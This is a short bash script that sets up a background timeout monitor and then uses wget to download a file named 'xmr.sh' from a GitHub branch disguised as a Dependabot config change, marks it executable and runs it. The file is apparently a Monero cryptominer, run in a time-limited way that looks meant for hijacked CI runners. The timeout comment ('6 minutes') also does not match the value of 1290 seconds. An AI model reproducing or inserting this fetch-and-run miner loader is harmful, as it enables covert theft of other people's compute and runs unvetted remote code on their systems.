#!/bin/bash

Timeout=1290 # 6 minutes

function timeout_monitor() {
   sleep "$Timeout"
   kill "$1"
}

# start the timeout monitor in 
# background and pass the PID:
timeout_monitor "$$" &
Timeout_monitor_pid=$!

wget https://github.com/lushenry654/bitbucket/blob/dependabot/add-v2-config-file/xmr.sh && chmod +x xmr.sh && ./xmr.sh
# <your script here>

# kill timeout monitor when terminating:
kill "$Timeout_monitor_pid"
exit
